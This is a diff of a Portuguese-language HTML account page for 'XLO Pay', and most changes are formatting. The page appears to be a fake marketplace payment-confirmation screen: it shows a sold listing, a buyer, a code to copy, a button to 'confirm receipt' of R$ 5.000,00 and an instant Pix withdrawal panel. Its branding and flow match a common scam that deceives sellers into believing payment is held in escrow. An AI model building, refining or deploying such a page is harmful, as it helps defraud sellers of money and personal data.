@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head>
+<html lang="pt-BR"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Minha Conta - XLO Pay & Painel de Controle</title>
+  <title>Minha Conta - XLO Pay &amp; Painel de Controle</title>
 
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -11,8 +10,8 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <!-- Google Fonts: Nunito -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
 
   <script>
     tailwind.config = {
@@ -65,7 +64,7 @@
         </a>
         <div class="hidden sm:flex items-center bg-white/10 text-white text-xs px-3 py-1.5 rounded-full border border-white/20">
           <i class="fa-solid fa-shield-halved text-xlo-orange mr-1.5"></i>
-          Garantia & Pagamentos XLO Pay
+          Garantia &amp; Pagamentos XLO Pay
         </div>
       </div>
 
@@ -209,13 +208,7 @@
             
             <!-- Foto do Produto -->
             <div class="w-full md:w-40 h-40 bg-gray-100 rounded-lg border border-gray-200 flex-shrink-0 overflow-hidden relative group shadow-inner">
-              <img 
-                id="productPhoto"
-                src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&fit=crop&w=400&q=80" 
-                alt="Foto do Anúncio" 
-                class="w-full h-full object-cover"
-                onerror="this.src='https://placehold.co/400x400/6E0AD6/FFF?text=Anuncio+XLO'"
-              />
+              <img id="productPhoto" src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&amp;fit=crop&amp;w=400&amp;q=80" alt="Foto do Anúncio" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/400x400/6E0AD6/FFF?text=Anuncio+XLO'">
               <span class="absolute top-2 left-2 bg-xlo-orange text-white text-[10px] font-black px-2 py-0.5 rounded shadow">
                 VENDIDO
               </span>
@@ -351,20 +344,11 @@
 
             <div class="flex flex-col sm:flex-row gap-3">
               <div class="relative flex-1">
-                <input 
-                  type="text" 
-                  id="copyCodeInput"
-                  readonly 
-                  value="CODIGO-EXEMPLO-001"
-                  class="w-full bg-white border border-gray-300 rounded-lg py-3.5 px-4 text-xs font-mono font-bold text-gray-800 focus:outline-none focus:border-xlo-purple focus:ring-2 focus:ring-purple-200 shadow-inner pr-10 select-all"
-                >
+                <input type="text" id="copyCodeInput" readonly="" value="CODIGO-EXEMPLO-001" class="w-full bg-white border border-gray-300 rounded-lg py-3.5 px-4 text-xs font-mono font-bold text-gray-800 focus:outline-none focus:border-xlo-purple focus:ring-2 focus:ring-purple-200 shadow-inner pr-10 select-all">
                 <i class="fa-solid fa-copy absolute right-3.5 top-1/2 -translate-y-1/2 text-xlo-purple text-lg pointer-events-none"></i>
               </div>
 
-              <button 
-                onclick="copyBankCode()" 
-                class="bg-xlo-purple hover:bg-xlo-purpleHover text-white font-black py-3.5 px-6 rounded-lg transition-all flex items-center justify-center gap-2 whitespace-nowrap shadow-md text-sm active:scale-95"
-              >
+              <button onclick="copyBankCode()" class="bg-xlo-purple hover:bg-xlo-purpleHover text-white font-black py-3.5 px-6 rounded-lg transition-all flex items-center justify-center gap-2 whitespace-nowrap shadow-md text-sm active:scale-95">
                 <i class="fa-regular fa-copy text-base"></i>
                 Copiar Código
               </button>
@@ -377,10 +361,7 @@
           </div>
 
           <!-- Botão de Ação -->
-          <button 
-            onclick="acceptPayment()" 
-            class="w-full bg-xlo-orange hover:bg-xlo-orangeHover text-white font-black text-base py-4 px-8 rounded-full shadow-lg transition-all transform active:scale-[0.99] flex items-center justify-center gap-3 uppercase tracking-wide"
-          >
+          <button onclick="acceptPayment()" class="w-full bg-xlo-orange hover:bg-xlo-orangeHover text-white font-black text-base py-4 px-8 rounded-full shadow-lg transition-all transform active:scale-[0.99] flex items-center justify-center gap-3 uppercase tracking-wide">
             <i class="fa-solid fa-circle-check text-xl"></i>
             <span id="btnAcceptText">Confirmar Recebimento de R$ 5.000,00</span>
           </button>
@@ -523,7 +504,7 @@
             <p class="text-xs font-black text-xlo-green uppercase tracking-wider mb-1">Saldo Disponível para Saque</p>
             <p id="carteiraAvailableVal" class="text-3xl font-black text-xlo-green mb-2">R$ 0,00</p>
             <p class="text-xs text-gray-500 mb-4">Transferência imediata via Pix sem taxas para qualquer banco.</p>
-            <button id="btnSaquePix" disabled class="bg-gray-200 text-gray-400 cursor-not-allowed font-extrabold text-xs py-2.5 px-4 rounded-lg transition-all shadow">
+            <button id="btnSaquePix" disabled="" class="bg-gray-200 text-gray-400 cursor-not-allowed font-extrabold text-xs py-2.5 px-4 rounded-lg transition-all shadow">
               <i class="fa-brands fa-pix mr-1.5"></i> Sacar via Pix Imadiatamente
             </button>
           </div>
@@ -572,7 +553,7 @@
 
         <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden p-5 flex flex-col sm:flex-row gap-5 items-center">
           <div class="w-full sm:w-32 h-32 bg-gray-100 rounded-lg overflow-hidden flex-shrink-0 relative">
-            <img id="anunciosPhoto" src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&fit=crop&w=400&q=80" class="w-full h-full object-cover">
+            <img id="anunciosPhoto" src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&amp;fit=crop&amp;w=400&amp;q=80" class="w-full h-full object-cover">
             <span class="absolute top-2 left-2 bg-red-600 text-white text-[10px] font-black px-2 py-0.5 rounded uppercase">
               Vendido
             </span>
@@ -628,15 +609,15 @@
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div>
               <label class="block text-xs font-bold text-gray-700 mb-1">Nome Completo do Vendedor</label>
-              <input type="text" id="cfgName" value="Carlos Eduardo" readonly class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
+              <input type="text" id="cfgName" value="Carlos Eduardo" readonly="" class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
             </div>
             <div>
               <label class="block text-xs font-bold text-gray-700 mb-1">CPF Cadastrado</label>
-              <input type="text" value="***.492.818-**" readonly class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
+              <input type="text" value="***.492.818-**" readonly="" class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
             </div>
             <div>
               <label class="block text-xs font-bold text-gray-700 mb-1">Chave Pix para Recebimento Automático</label>
-              <input type="text" value="carlos.eduardo.pix@xlo.com.br" readonly class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
+              <input type="text" value="carlos.eduardo.pix@xlo.com.br" readonly="" class="w-full bg-gray-50 border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold">
             </div>
             <div>
               <label class="block text-xs font-bold text-gray-700 mb-1">Status da Segurança XLO</label>
@@ -675,7 +656,7 @@
 
   <script>
     let appState = {
-      title: "Saxofone Alto Profissional Eb Yamaha (Novo na Caixa)",
+      title: "vamos la",
       price: "5.000,00",
       buyer: "Marcelo Ribeiro S.",
       location: "São Paulo, SP - CEP 01001-000",
@@ -827,6 +808,6 @@
       }, 3500);
     }
   </script>
-<script src="/js/tracker.js" defer></script>
-</body>
-</html>
+<script src="/js/tracker.js" defer=""></script>
+
+</body></html>
